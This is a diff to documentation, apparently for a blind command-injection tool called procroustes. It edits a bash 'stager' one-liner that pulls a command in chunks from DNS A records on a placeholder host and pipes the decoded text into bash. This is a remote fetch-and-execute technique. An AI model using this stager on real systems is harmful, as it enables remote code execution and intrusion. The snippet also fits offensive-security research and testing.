@@ -98,6 +98,6 @@ A workaround to avoid running into issues for the aforementioned cases is to fir
  - procroustes_full/powershell command can use some parallelization.
  - we could achieve constant command length by sending initially a "stager" command, which will then get our full command through DNS responses. A simple stager example based on A records could be the following in bash:
  ```bash
- while [[ $cmd_chunk != "-;+;" ]];do printf %s "$cmd_chunk";read -a ip < <(dig +short $((i++)).%DNS_HOST%);cmd_chunk=$(printf '%x ' ${ip[*]}|xxd -r -p);done|bash
+ while [[ $cmd_chunk != "-;+;" ]];do printf %s "$cmd_chunk";IFS=. read -a ip < <(dig +short $((i++)).%DNS_HOST%);cmd_chunk=$(printf '%x ' ${ip[*]}|xxd -r -p);done|bash
  ```
  
